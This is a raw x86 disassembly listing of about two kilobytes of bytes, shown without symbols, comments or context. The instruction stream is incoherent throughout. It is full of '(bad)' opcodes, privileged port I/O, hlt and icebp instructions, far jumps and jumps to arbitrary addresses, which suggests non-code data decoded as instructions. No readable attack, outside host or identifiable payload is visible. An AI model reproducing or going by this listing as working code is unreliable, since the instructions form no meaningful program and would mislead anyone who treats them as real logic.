  4148fb:	outs   dx,DWORD PTR ds:[esi]
  4148fc:	data16 jg 0x4148ee
  4148ff:	sbb    esp,DWORD PTR [edi+0x685dfb0]
  414905:	in     al,dx
  414906:	mov    WORD PTR [eax],?
  414908:	hlt    
  414909:	mov    dh,0x39
  41490b:	stos   BYTE PTR es:[edi],al
  41490c:	add    DWORD PTR [esi+eax*4-0x1411f67d],esp
  414913:	call   0xbc862d49
  414918:	bound  edx,QWORD PTR [eax-0x78]
  41491b:	jecxz  0x414952
  41491d:	mov    DWORD PTR [edx],edi
  41491f:	mov    ecx,0xc7b24308
  414924:	sbb    BYTE PTR [ebx+0x1406b666],ah
  41492a:	mov    ds:0x2b507ba7,al
  41492f:	retf   0x7a80
  414932:	daa    
  414933:	arpl   WORD PTR [ecx-0x59],sp
  414936:	mov    ah,0x28
  414938:	rol    DWORD PTR [edi],0x81
  41493b:	fmul   QWORD PTR [eax]
  41493d:	pop    eax
  41493e:	push   edx
  41493f:	cmp    ebx,edi
  414941:	pop    ss
  414942:	icebp  
  414943:	inc    DWORD PTR [edi-0xf]
  414946:	es imul esp,edi,0x6547dce9
  41494d:	pop    ss
  41494e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41494f:	adc    eax,0xa878193f
  414954:	fidiv  DWORD PTR [ecx+0x704c6984]
  41495a:	aas    
  41495b:	dec    eax
  41495c:	adc    eax,0x587a46f7
  414961:	sbb    ch,BYTE PTR [edi+0x8adc8d2]
  414967:	sub    al,0x8
  414969:	mov    edx,0x56a2b488
  41496e:	leave  
  41496f:	pop    ds
  414970:	push   edx
  414971:	icebp  
  414972:	clc    
  414973:	scas   al,BYTE PTR es:[edi]
  414974:	xchg   DWORD PTR [ebx],edi
  414976:	xchg   ebp,eax
  414977:	scas   eax,DWORD PTR es:[edi]
  414978:	mov    eax,0xdfb6d936
  41497d:	std    
  41497e:	xchg   DWORD PTR [ebx],ebp
  414980:	adc    al,0x4e
  414982:	mov    eax,ds:0x83e2168d
  414987:	mov    ecx,0xa7817a85
  41498c:	jns    0x414995
  41498e:	out    0xae,al
  414990:	xchg   edi,eax
  414991:	or     al,0xf3
  414993:	jb     0x41498c
  414995:	pop    ebx
  414996:	pop    ss
  414997:	jle    0x414965
  414999:	inc    ebp
  41499a:	es xchg esp,eax
  41499c:	pop    ebp
  41499d:	(bad)
  4149a3:	ss ret 0xe432
  4149a7:	pop    ecx
  4149a8:	jmp    0xd6b8d63e
  4149ad:	lock push ds
  4149af:	push   0xffffff97
  4149b1:	xor    esp,edx
  4149b3:	mov    esp,esp
  4149b5:	xchg   esi,eax
  4149b6:	dec    ecx
  4149b7:	test   eax,eax
  4149b9:	inc    ebx
  4149ba:	outs   dx,BYTE PTR ds:[esi]
  4149bb:	pop    edi
  4149bc:	adc    eax,0x8871899e
  4149c1:	jno    0x414953
  4149c3:	fxch   st(3)
  4149c5:	test   al,0x68
  4149c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c8:	jb     0x4149c8
  4149ca:	dec    edx
  4149cb:	and    DWORD PTR [edx],0xfffffff1
  4149ce:	lock sbb edx,edi
  4149d1:	push   eax
  4149d2:	lahf   
  4149d3:	dec    edi
  4149d4:	or     al,0x65
  4149d6:	cmp    bl,0xae
  4149d9:	jno    0x414a1a
  4149db:	cmp    DWORD PTR [ecx+0x6],edx
  4149de:	mov    dh,0xc6
  4149e0:	lea    eax,[eax]
  4149e2:	test   eax,0x6e92c378
  4149e7:	sub    ch,dl
  4149e9:	inc    esi
  4149ea:	push   ss
  4149eb:	out    0xf7,eax
  4149ed:	xchg   ebp,eax
  4149ee:	sbb    DWORD PTR [esp+eiz*4-0x6a],ecx
  4149f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149f3:	neg    BYTE PTR [ebx]
  4149f5:	add    al,0xdf
  4149f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f8:	mov    ecx,0x901be5a
  4149fd:	mov    eax,0x38f2a414
  414a02:	mov    al,ds:0xf27c080d
  414a07:	int    0x64
  414a09:	out    dx,eax
  414a0a:	fdivr  QWORD PTR ds:0x497af0c8
  414a10:	mov    ebx,0x21788a7a
  414a15:	ds and al,0x65
  414a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a19:	inc    esi
  414a1a:	xchg   DWORD PTR [ebp+0x41e8ab3a],edx
  414a20:	or     DWORD PTR [edx-0x5b],0x28
  414a24:	lods   eax,DWORD PTR ds:[esi]
  414a25:	in     al,0xab
  414a27:	mov    dh,0x8
  414a29:	enter  0x96fe,0xad
  414a2d:	jne    0x414a55
  414a2f:	mov    cl,0xf4
  414a31:	lock push es
  414a33:	dec    ebp
  414a34:	enter  0x626b,0xf6
  414a38:	dec    edi
  414a39:	stos   BYTE PTR es:[edi],al
  414a3a:	dec    ecx
  414a3b:	stos   BYTE PTR es:[edi],al
  414a3c:	or     al,cl
  414a3e:	out    0xa2,al
  414a40:	scas   al,BYTE PTR es:[edi]
  414a41:	jnp    0x414ac0
  414a43:	xor    DWORD PTR [ebx-0x38],ebp
  414a46:	cwd    
  414a48:	out    0xf1,eax
  414a4a:	dec    ebx
  414a4b:	(bad)  
  414a4c:	sub    al,0x19
  414a4e:	popf   
  414a4f:	in     eax,dx
  414a50:	or     eax,edi
  414a52:	lock xchg edx,eax
  414a54:	xor    BYTE PTR [edi+ebx*2+0x12f7904c],bh
  414a5b:	add    al,BYTE PTR [edi+0x61]
  414a5e:	sbb    ch,BYTE PTR [edx-0x67]
  414a61:	jno    0x414a8b
  414a63:	repz or BYTE PTR [eax-0x7f],cl
  414a67:	(bad)  [esi-0x79024e95]
  414a6d:	icebp  
  414a6e:	jbe    0x414a92
  414a70:	arpl   si,cx
  414a72:	mov    edi,0x12a9cda0
  414a77:	push   esi
  414a78:	arpl   ax,bp
  414a7a:	xchg   DWORD PTR [ecx+0x3d],ecx
  414a7d:	int3   
  414a7e:	daa    
  414a7f:	xchg   ecx,eax
  414a80:	jge    0x414a80
  414a82:	das    
  414a83:	sub    BYTE PTR [esi],dh
  414a85:	adc    DWORD PTR [edi-0x1b47f112],edx
  414a8b:	push   ds
  414a8c:	rol    DWORD PTR [ecx+0x4098eea1],cl
  414a92:	push   0x4b
  414a94:	mov    bh,0xb4
  414a96:	jl     0x414aea
  414a98:	in     eax,dx
  414a99:	loop   0x414a5f
  414a9b:	fcomp  QWORD PTR [eax+ecx*2]
  414a9e:	pop    ds
  414a9f:	add    BYTE PTR [eax],cl
  414aa1:	mov    al,ds:0xc415767a
  414aa6:	jge    0x414a31
  414aa8:	jge    0x414b1c
  414aaa:	repz sub ch,bh
  414aad:	in     eax,0xbc
  414aaf:	sub    eax,0xaf26d808
  414ab4:	mov    ch,0xc8
  414ab6:	dec    esp
  414ab7:	shr    BYTE PTR [eax+0x3211d4f7],1
  414abd:	push   0xffffff9c
  414abf:	pop    eax
  414ac0:	enter  0xcef3,0x52
  414ac4:	or     BYTE PTR [eax],al
  414ac6:	dec    edi
  414ac7:	cld    
  414ac8:	sub    edi,DWORD PTR [esi]
  414aca:	adc    eax,0xecf3af5c
  414acf:	pusha  
  414ad0:	and    al,0x64
  414ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad3:	rcl    BYTE PTR [edx+0x30],1
  414ad6:	mov    ch,0x59
  414ad8:	or     bh,BYTE PTR [eax+0x60]
  414adb:	cmp    esi,DWORD PTR [di-0x63ff]
  414ae0:	xlat   BYTE PTR ds:[ebx]
  414ae1:	test   al,0xe0
  414ae3:	sbb    bh,ch
  414ae5:	ficomp WORD PTR [ebx-0x708e86fa]
  414aeb:	adc    ebp,DWORD PTR [edx]
  414aed:	cmp    al,BYTE PTR gs:[eax]
  414af0:	push   es
  414af1:	rcr    BYTE PTR [esi-0x31a8b408],cl
  414af7:	lds    edx,FWORD PTR [esp+esi*4+0x16031e67]
  414afe:	push   ebp
  414aff:	sub    BYTE PTR [ebx+0x25],dh
  414b02:	imul   ebx,DWORD PTR ds:0x975f3606,0x6
  414b09:	pushf  
  414b0a:	mov    bh,0xff
  414b0c:	rsqrtps xmm4,xmm6
  414b0f:	xchg   esp,eax
  414b10:	(bad)  
  414b11:	jg     0x414b44
  414b13:	sub    BYTE PTR [edx-0x78],al
  414b16:	fiadd  WORD PTR [eax+ecx*1]
  414b19:	cmp    al,0xdb
  414b1b:	sub    DWORD PTR [edx+eiz*8+0x3148ae19],edx
  414b22:	or     eax,0x6a4fef91
  414b27:	sub    DWORD PTR [edx],esp
  414b29:	test   DWORD PTR [ecx-0x1a15f7cc],edi
  414b2f:	pusha  
  414b30:	imul   ebx,DWORD PTR [edx],0xf0eb7f46
  414b36:	mov    dl,0x2c
  414b38:	jmp    0x1f3f39ea
  414b3d:	addr16 cmp eax,0xe71401f8
  414b43:	les    eax,FWORD PTR [ecx]
  414b45:	fistp  WORD PTR [ecx]
  414b47:	loop   0x414b0a
  414b49:	adc    al,BYTE PTR [esi-0x2bb854fc]
  414b4f:	sub    bh,cl
  414b51:	fistp  WORD PTR [edx+ecx*1+0x2]
  414b55:	or     al,0xdf
  414b57:	and    al,0xfb
  414b59:	or     edx,DWORD PTR [edx-0x783508cb]
  414b5f:	dec    esp
  414b60:	sub    eax,0xc7284ca9
  414b65:	popa   
  414b66:	sbb    BYTE PTR [eax+edx*4-0x12eea4c4],dh
  414b6d:	pop    ss
  414b6e:	xor    dl,BYTE PTR [edx]
  414b70:	int3   
  414b71:	jge    0x414b7a
  414b73:	imul   esi,DWORD PTR [edi-0x10],0x4e
  414b77:	adc    BYTE PTR [ebx],dh
  414b79:	out    dx,eax
  414b7a:	adc    al,0xc
  414b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b7d:	or     al,0x8e
  414b7f:	xchg   ebp,eax
  414b80:	mov    al,0x86
  414b82:	xchg   BYTE PTR [ebp+0x555ff1e1],ch
  414b88:	aas    
  414b89:	mov    dl,dl
  414b8b:	sub    edx,ecx
  414b8d:	xor    bl,0x7e
  414b90:	or     esp,eax
  414b92:	aaa    
  414b93:	xchg   edx,eax
  414b94:	push   edi
  414b95:	jno    0x414c0c
  414b97:	imul   ebx,edi,0x832aa0f0
  414b9d:	mov    al,0xb3
  414b9f:	std    
  414ba0:	jmp    0x547a33a9
  414ba5:	cmp    DWORD PTR [ecx-0x246f48c5],ecx
  414bab:	inc    ecx
  414bac:	cli    
  414bad:	lock adc al,0x86
  414bb0:	jbe    0x414b89
  414bb2:	pop    ecx
  414bb3:	sbb    al,0xbf
  414bb5:	adc    al,0xfd
  414bb7:	mov    ds:0x818626d6,eax
  414bbc:	nop
  414bbd:	push   ss
  414bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc0:	dec    ebp
  414bc1:	hlt    
  414bc2:	stos   BYTE PTR es:[edi],al
  414bc3:	sub    DWORD PTR [ebx+0x95843f0],ebp
  414bc9:	in     al,dx
  414bca:	(bad)  
  414bcc:	fwait
  414bcd:	sar    DWORD PTR [ebx],0x5e
  414bd0:	repz mul DWORD PTR [eax-0x1cc31304]
  414bd7:	test   ebp,0x892b7d1b
  414bdd:	mov    DWORD PTR [ebp+esi*8+0xaf8f146],edx
  414be4:	fnsave [ebx+0x6b0f98fb]
  414bea:	sub    ebx,DWORD PTR [edx-0x6a792a3c]
  414bf0:	retf   
  414bf1:	xor    DWORD PTR [ecx+0x50619539],edi
  414bf7:	or     BYTE PTR ss:[edx+0x3c],bh
  414bfb:	loop   0x414c15
  414bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bfe:	jmp    0x414bc6
  414c00:	ja     0x414bfc
  414c02:	call   0xd368:0x8e242fe7
  414c09:	and    eax,0x7b872ce5
  414c0e:	pusha  
  414c0f:	sub    BYTE PTR [edi-0x3c0e7f60],dh
  414c15:	xor    edx,DWORD PTR [ebx]
  414c17:	pop    es
  414c18:	rcl    al,cl
  414c1a:	xchg   BYTE PTR [ebp+0x5ed4c72a],al
  414c20:	dec    edi
  414c21:	outs   dx,BYTE PTR ds:[esi]
  414c22:	daa    
  414c23:	and    bh,al
  414c25:	icebp  
  414c26:	retf   
  414c27:	and    eax,0x47a34696
  414c2c:	inc    edx
  414c2d:	ins    BYTE PTR es:[edi],dx
  414c2e:	xchg   DWORD PTR [edi],ebp
  414c30:	push   esi
  414c31:	pop    ebx
  414c32:	cmp    cl,BYTE PTR [esi-0x1d]
  414c35:	jecxz  0x414bec
  414c37:	imul   edx,DWORD PTR es:[ecx],0x8c681b37
  414c3e:	xchg   edx,eax
  414c3f:	cmp    BYTE PTR gs:[ebp-0x1bb16e7a],0x53
  414c47:	shr    DWORD PTR [ecx],cl
  414c49:	fdiv   DWORD PTR ds:0xe183b29
  414c4f:	ins    BYTE PTR es:[edi],dx
  414c50:	stc    
  414c51:	rol    BYTE PTR [edi-0x781d4eaa],cl
  414c57:	dec    edi
  414c58:	cmp    eax,0x4447bfcc
  414c5d:	iret   
  414c5e:	ins    BYTE PTR es:[edi],dx
  414c5f:	int    0x6b
  414c61:	dec    edx
  414c62:	pop    ss
  414c63:	not    BYTE PTR [ebx-0x4489958]
  414c69:	inc    edi
  414c6a:	xchg   DWORD PTR [ebx],edi
  414c6c:	push   eax
  414c6d:	mov    ds:0xce08ea02,al
  414c72:	adc    cl,BYTE PTR [edi-0x2e331481]
  414c78:	cmp    eax,0x5429e1b8
  414c7d:	cld    
  414c7e:	ret    
  414c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c80:	test   DWORD PTR [ebp-0x1e],0x2d7af419
  414c87:	pop    ecx
  414c88:	outs   dx,BYTE PTR ds:[esi]
  414c89:	icebp  
  414c8a:	outs   dx,BYTE PTR ds:[esi]
  414c8b:	xor    al,0x32
  414c8d:	push   edx
  414c8e:	jle    0x414c70
  414c90:	and    dl,BYTE PTR [edx-0x68be24c4]
  414c96:	xchg   BYTE PTR [ecx-0x5508e843],bh
  414c9c:	jne    0x414ca2
  414c9e:	ins    BYTE PTR es:[edi],dx
  414c9f:	sub    bh,bh
  414ca1:	fistp  WORD PTR [ebx+0x43]
  414ca4:	or     DWORD PTR [esi],edx
  414ca6:	je     0x414c4e
  414ca8:	into   
  414ca9:	mov    eax,0xf08e7bc6
  414cae:	aam    0x25
  414cb0:	xchg   ebp,eax
  414cb1:	rcr    eax,0x4f
  414cb4:	mov    ebx,0xea90a5b7
  414cb9:	dec    edx
  414cba:	xchg   DWORD PTR [ebx+0x2c],esp
  414cbd:	aas    
  414cbe:	xor    dh,BYTE PTR [ebp-0x77]
  414cc1:	scas   al,BYTE PTR es:[edi]
  414cc2:	cld    
  414cc3:	push   edx
  414cc4:	sub    DWORD PTR [esi],eax
  414cc6:	xchg   BYTE PTR [ebp+0x40dcff67],al
  414ccc:	int3   
  414ccd:	out    0x87,eax
  414ccf:	push   edi
  414cd0:	loopne 0x414d39
  414cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd3:	pop    edi
  414cd4:	sub    ebp,DWORD PTR [edi+0x21bc29ad]
  414cda:	or     eax,0x8833dc66
  414cdf:	(bad)  
  414ce0:	cmp    edi,ebp
  414ce2:	test   BYTE PTR [ecx+0xc111623],dh
  414ce8:	data16 icebp 
  414cea:	inc    esi
  414ceb:	pop    ebx
  414cec:	xor    al,BYTE PTR [edi]
  414cee:	lods   eax,DWORD PTR ds:[esi]
  414cef:	xchg   ebx,eax
  414cf0:	dec    ebp
  414cf1:	add    ebx,DWORD PTR [ecx-0x71]
  414cf4:	add    BYTE PTR [ebp-0x6daf687a],al
  414cfa:	sbb    eax,0x7035ffce
  414cff:	sub    ebp,esp
  414d01:	les    ebx,FWORD PTR [eax+0x6c]
  414d04:	and    eax,0x8f07acc
  414d09:	lods   al,BYTE PTR ds:[esi]
  414d0a:	or     eax,0xf8601e25
  414d0f:	int3   
  414d10:	or     esi,0x56
  414d13:	sub    DWORD PTR [ecx-0x66],edi
  414d16:	mov    edi,esp
  414d18:	psubsb mm7,QWORD PTR [edx-0x75087414]
  414d1f:	jno    0x414cd4
  414d21:	iret   
  414d22:	(bad)  
  414d23:	stc    
  414d24:	repz cmp eax,0x20c428cb
  414d2a:	xchg   edi,eax
  414d2b:	test   BYTE PTR [eax],cl
  414d2d:	add    al,0x51
  414d2f:	jmp    0xf75f:0x7bd2b700
  414d36:	dec    esp
  414d37:	fild   WORD PTR ds:0x78807a7b
  414d3d:	in     eax,0xba
  414d3f:	pop    eax
  414d40:	and    al,0x60
  414d42:	fucomp st(3)
  414d44:	or     DWORD PTR [eax+0x4e],esp
  414d47:	cli    
  414d48:	cmp    al,0x34
  414d4a:	stos   BYTE PTR es:[edi],al
  414d4b:	jne    0x414d65
  414d4d:	not    DWORD PTR [edx-0x24]
  414d50:	add    ebx,DWORD PTR [ebp+esi*8-0x16]
  414d54:	pop    es
  414d55:	popa   
  414d56:	jmp    0x414d88
  414d58:	call   0xfb926316
  414d5d:	imul   ebx,DWORD PTR [ebx-0x2b2b6ebb],0xffffffe8
  414d64:	jp     0x414d4b
  414d66:	dec    esp
  414d67:	push   ebx
  414d68:	adc    al,0x98
  414d6a:	jno    0x414d9b
  414d6c:	push   ebx
  414d6d:	lock scas eax,DWORD PTR es:[edi]
  414d6f:	adc    ch,BYTE PTR [ebx+0x35438aa2]
  414d75:	ror    dl,1
  414d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d78:	or     DWORD PTR [eax+0x57269e26],ecx
  414d7e:	daa    
  414d7f:	fwait
  414d80:	loope  0x414d64
  414d82:	and    al,0x37
  414d84:	or     ah,ch
  414d86:	(bad)  
  414d87:	out    0xa8,al
  414d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d8a:	mov    ds:0x858a499f,al
  414d8f:	iret   
  414d90:	sub    al,0x8f
  414d92:	enter  0x9d62,0xf2
  414d96:	es mov esi,ss
  414d99:	retf   
  414d9a:	dec    ebx
  414d9b:	jne    0x414d43
  414d9d:	adc    DWORD PTR [esi-0x62],edi
  414da0:	idiv   DWORD PTR [ecx-0x6d]
  414da3:	sub    dh,bl
  414da5:	inc    ecx
  414da6:	xchg   ecx,eax
  414da7:	mov    al,ds:0x81e2f10a
  414dac:	push   edi
  414dad:	jno    0x414db3
  414daf:	pop    eax
  414db0:	int3   
  414db1:	adc    bl,0x1b
  414db4:	pop    es
  414db5:	rol    BYTE PTR [eax+0x64f32c31],0xb2
  414dbc:	shl    DWORD PTR [ebx+0x68d490a6],1
  414dc2:	cmp    eax,0x150c7360
  414dc7:	adc    DWORD PTR [ecx],ebp
  414dc9:	out    0xb0,eax
  414dcb:	sub    BYTE PTR [ebx+0x5e22c0f],al
  414dd1:	jno    0x414dfa
  414dd3:	daa    
  414dd4:	mov    edx,0x3b635d10
  414dd9:	jne    0x414d84
  414ddb:	jae    0x414d92
  414ddd:	pop    ss
  414dde:	lahf   
  414ddf:	int    0x29
  414de1:	icebp  
  414de2:	push   0x34
  414de4:	mov    esi,0xae3e536a
  414de9:	(bad)  
  414deb:	call   0x37c8e5d8
  414df0:	cmp    DWORD PTR [ecx+0x18],0x7
  414df4:	xor    al,dh
  414df6:	ror    dl,1
  414df8:	and    eax,0x8a11727
  414dfd:	jl     0x877993d8
  414e03:	dec    edi
  414e04:	adc    DWORD PTR [eax],edx
  414e06:	mov    ebp,0xb4eb35c7
  414e0b:	push   ecx
  414e0c:	pop    es
  414e0d:	adc    al,BYTE PTR [edi+0x1d1caf3d]
  414e13:	int3   
  414e14:	and    al,0xdd
  414e16:	xchg   BYTE PTR ds:0x65647c6e,bh
  414e1c:	std    
  414e1d:	sub    eax,0x9f9e28a2
  414e22:	pop    esp
  414e23:	lods   eax,DWORD PTR ds:[esi]
  414e24:	shl    DWORD PTR [ecx],cl
  414e26:	sahf   
  414e27:	pop    ecx
  414e28:	sub    esp,ebp
  414e2a:	test   ch,dh
  414e2c:	loopne 0x414e05
  414e2e:	push   ss
  414e2f:	lahf   
  414e30:	jecxz  0x414e22
  414e32:	cs dec esi
  414e34:	pavgw  mm2,QWORD PTR [edi]
  414e37:	mov    BYTE PTR es:[esi+ecx*1],ah
  414e3b:	fimul  DWORD PTR [ecx]
  414e3d:	or     eax,0xfe76af93
  414e42:	add    ebx,DWORD PTR [esi]
  414e44:	dec    edi
  414e45:	pop    esi
  414e46:	pop    edx
  414e47:	cmp    al,0xa8
  414e49:	ins    BYTE PTR es:[edi],dx
  414e4a:	or     DWORD PTR [ebx-0x55],ebp
  414e4d:	(bad)  
  414e4e:	mov    al,0x79
  414e50:	jmp    0x4d86:0x9a2a51ff
  414e57:	or     DWORD PTR [ecx],ecx
  414e59:	push   0xffffff83
  414e5b:	fidiv  WORD PTR [ecx]
  414e5d:	jae    0x414e0c
  414e5f:	clc    
  414e60:	stos   DWORD PTR es:[edi],eax
  414e61:	icebp  
  414e62:	xchg   esi,eax
  414e63:	ret    
  414e64:	and    al,0x9e
  414e66:	pop    es
  414e67:	int    0x44
  414e69:	cs inc ecx
  414e6b:	or     eax,0xc9867b22
  414e70:	fld    QWORD PTR [edi-0x64]
  414e73:	inc    BYTE PTR [ebx-0x47]
  414e76:	std    
  414e77:	sub    eax,esp
  414e79:	fwait
  414e7a:	mov    al,ds:0x356df797
  414e7f:	outs   dx,DWORD PTR ds:[esi]
  414e80:	mov    cl,0x2a
  414e82:	out    dx,eax
  414e83:	test   al,0x3c
  414e85:	dec    BYTE PTR [esp+eax*4]
  414e88:	push   esp
  414e89:	into   
  414e8a:	sbb    edi,DWORD PTR [edx+ebx*4+0x9498f03]
  414e91:	sub    BYTE PTR [ecx-0x79],ah
  414e94:	mov    ebp,0x2748aed8
  414e99:	hlt    
  414e9a:	into   
  414e9b:	mov    eax,ds:0x19a3f7f6
  414ea0:	enter  0x57b2,0x33
  414ea4:	neg    ebx
  414ea6:	push   eax
  414ea7:	cmp    BYTE PTR [ebx-0x59134b2d],bl
  414ead:	lock sbb al,0x6b
  414eb0:	mov    ah,0x7c
  414eb2:	imul   esi,ecx,0xa2cc13fd
  414eb8:	xlat   BYTE PTR ds:[ebx]
  414eb9:	loop   0x414e3b
  414ebb:	pop    es
  414ebc:	js     0x414ef0
  414ebe:	cmc    
  414ebf:	sbb    ebx,DWORD PTR [eax+esi*2-0x59]
  414ec3:	test   BYTE PTR [ebx+0x1ae1b908],dh
  414ec9:	scas   eax,DWORD PTR es:[edi]
  414eca:	xchg   BYTE PTR [ebp-0x7f16ba6d],cl
  414ed0:	xor    ebx,DWORD PTR [eax]
  414ed2:	mov    al,ds:0xb7842329
  414ed7:	sub    esi,esi
  414ed9:	sbb    ch,BYTE PTR [eax-0x78f552b6]
  414edf:	pop    es
  414ee0:	fisttp QWORD PTR [esi+ecx*2-0xfde8efd]
  414ee7:	sub    ah,ah
  414ee9:	lock sbb eax,0xd30bf7a1
  414eef:	push   esi
  414ef0:	dec    ecx
  414ef1:	and    eax,0xf2af6ba3
  414ef6:	ins    BYTE PTR es:[edi],dx
  414ef7:	inc    ebp
  414ef8:	repz mov edx,0x601ed3cf
  414efe:	test   DWORD PTR [eax-0x1910a5f8],ebx
  414f04:	(bad)  
  414f05:	mov    ebp,gs
  414f07:	adc    eax,0xeeb6f1da
  414f0c:	inc    esi
  414f0d:	xchg   esp,eax
  414f0e:	cmp    ah,bh
  414f10:	mov    esp,0xf8f87318
  414f15:	retf   0x2f72
  414f18:	out    dx,al
  414f19:	scas   al,BYTE PTR es:[edi]
  414f1a:	mov    BYTE PTR ds:0x147af3f7,ch
  414f20:	mov    ebp,0xe171272d
  414f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f26:	mov    gs,WORD PTR [ecx]
  414f28:	ficomp WORD PTR [edx+0x35]
  414f2b:	add    ecx,DWORD PTR [eax]
  414f2d:	add    al,ah
  414f2f:	and    BYTE PTR [ebx-0x1b],ch
  414f32:	pop    ds
  414f33:	fcmovnbe st,st(7)
  414f35:	int    0x64
  414f37:	jae    0x414f6d
  414f39:	jecxz  0x414f9a
  414f3b:	in     al,dx
  414f3c:	or     BYTE PTR [ecx+0xdee6e62],al
  414f42:	sahf   
  414f43:	in     al,0xdd
  414f45:	fnstcw WORD PTR [edi-0x78a019a9]
  414f4b:	push   ss
  414f4c:	mov    esp,0x3dfdf219
  414f51:	outs   dx,DWORD PTR ds:[esi]
  414f52:	aaa    
  414f53:	sub    DWORD PTR [ebx],esp
  414f55:	repnz dec edx
  414f57:	or     cl,bh
  414f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f5a:	loopne 0x414fd7
  414f5c:	sti    
  414f5d:	jne    0x414ee6
  414f5f:	add    DWORD PTR [eax-0x56],0x75
  414f63:	mov    DWORD PTR [edi-0x3b],esp
  414f66:	push   cs
  414f67:	sub    dl,dl
  414f69:	sbb    BYTE PTR [eiz*4-0xe9401f6],dh
  414f70:	pop    ss
  414f71:	dec    eax
  414f72:	fnsave [ecx]
  414f74:	lock jmp 0x414f47
  414f77:	ret    0x848f
  414f7a:	inc    ebp
  414f7b:	aaa    
  414f7c:	push   ss
  414f7d:	daa    
  414f7e:	(bad)  
  414f7f:	dec    ebp
  414f80:	lea    edi,[edi+0x6a1685c6]
  414f86:	loopne 0x414f6b
  414f88:	cmp    esi,DWORD PTR [eax+0x32]
  414f8b:	dec    edx
  414f8c:	shl    BYTE PTR fs:[ecx],0x5
  414f90:	xchg   edi,eax
  414f91:	push   ebp
  414f92:	and    ebp,DWORD PTR [ecx]
  414f94:	cmc    
  414f95:	ret    
  414f96:	push   cs
  414f97:	iret   
  414f98:	repnz push esi
  414f9a:	cmp    DWORD PTR [ecx+edx*8-0x32a079e2],0x42
  414fa2:	xchg   ecx,eax
  414fa3:	out    0xd9,al
  414fa5:	jecxz  0x414f59
  414fa7:	adc    al,0x40
  414fa9:	iret   
  414faa:	mov    ebx,0x454cfeb5
  414faf:	jl     0x414fc4
  414fb1:	dec    ebx
  414fb2:	sti    
  414fb3:	mov    ecx,0x85860109
  414fb8:	test   eax,0x63d92b99
  414fbd:	clc    
  414fbe:	cwde   
  414fbf:	in     al,dx
  414fc0:	dec    eax
  414fc1:	sti    
  414fc2:	jp     0x414f82
  414fc4:	jno    0x414f54
  414fc6:	xchg   esp,eax
  414fc7:	test   al,0x9
  414fc9:	fs pop ebx
  414fcb:	call   0x36e9fae
  414fd0:	cmc    
  414fd1:	lock mov esi,0x4f0f1312
  414fd7:	pushf  
  414fd8:	out    dx,al
  414fd9:	(bad)  
  414fdb:	mov    bl,0xe2
  414fdd:	xchg   WORD PTR [edi-0x53a723c9],bp
  414fe4:	popa   
  414fe5:	test   eax,0x8b8a297a
  414fea:	fisttp WORD PTR es:[ecx]
  414fed:	cmp    BYTE PTR [ebx+edx*4+0xd],0x27
  414ff2:	cmp    esp,ebx
  414ff4:	imul   ecx,DWORD PTR [edi+ebp*8],0xb3ed31ae
  414ffb:	sub    DWORD PTR [eax+0x1e831d3b],esi
  415001:	mov    edx,0xe258a8
  415006:	fdivr  DWORD PTR [edi+edx*1]
  415009:	cld    
  41500a:	(bad)  
  41500b:	cmp    ch,BYTE PTR cs:[ebx-0x4c7d2e06]
  415012:	(bad)  
  415013:	jle    0x415042
  415015:	inc    edi
  415016:	xchg   DWORD PTR [ecx-0x15],esp
  415019:	(bad)  
  41501a:	pop    edi
  41501b:	pop    eax
  41501c:	in     eax,0xb
  41501e:	retf   
  41501f:	sub    DWORD PTR [edi+0x51],esp
  415022:	ret    
  415023:	jnp    0x415075
  415025:	pop    eax
  415026:	dec    eax
  415027:	jns    0x415071
  415029:	fdiv   QWORD PTR [ecx]
  41502b:	pop    ecx
  41502c:	fsub   QWORD PTR [ebp-0x7a]
  41502f:	iret   
  415030:	dec    esp
  415031:	loopne 0x414ff8
  415033:	pusha  
  415034:	mov    edi,0x962fb786
  415039:	stos   DWORD PTR es:[edi],eax
  41503a:	lds    ebx,FWORD PTR [ebx+0xb]
  41503d:	xor    DWORD PTR fs:[ecx+0xc556163],0xc8b9d080
  415048:	sbb    eax,0x942893af
  41504d:	stos   DWORD PTR es:[edi],eax
  41504e:	out    dx,al
  41504f:	sbb    BYTE PTR [edx],cl
  415051:	aam    0xa0
  415053:	out    dx,al
  415054:	dec    ecx
  415055:	mov    esi,0xc3d1d457
  41505a:	mov    cs,WORD PTR cs:[eax-0xf27650f]
  415061:	dec    ecx
  415062:	adc    DWORD PTR [ecx-0x74],esp
  415065:	and    bh,BYTE PTR ds:0x86e85987
  41506b:	ror    ecx,cl
  41506d:	inc    edi
  41506e:	lds    esp,FWORD PTR [edx+0x29786f05]
  415074:	mov    ds:0x9c2d09c,eax
  415079:	and    al,0xbe
  41507b:	ffreep st(2)
  41507d:	data16 das 
  41507f:	pop    ebp
  415080:	mov    edi,0xb2e450f0
  415085:	in     al,0x4c
  415087:	(bad)  
  415088:	mov    eax,0xf3017039
  41508d:	rol    BYTE PTR [edi-0x1fb07737],1
  415093:	jmp    0x4150a4
  415095:	stos   BYTE PTR es:[edi],al
  415096:	cdq    
  415097:	sub    BYTE PTR [ecx+0x4c],ch
  41509a:	shr    DWORD PTR [esi],cl
  41509c:	not    edi
  41509e:	aam    0x74
  4150a0:	js     0x4150fc
  4150a2:	adc    ebp,DWORD PTR [edx-0x2f]
  4150a5:	retf   0xf4ac
  4150a8:	cs jo  0x41507d
  4150ab:	jmp    0x94f8251a
  4150b0:	push   cs
  4150b1:	xor    ch,BYTE PTR [ebp+0x622f6c4f]
  4150b7:	xchg   DWORD PTR [edi-0x50],ebx
  4150ba:	mov    ds:0x912dbc8,al
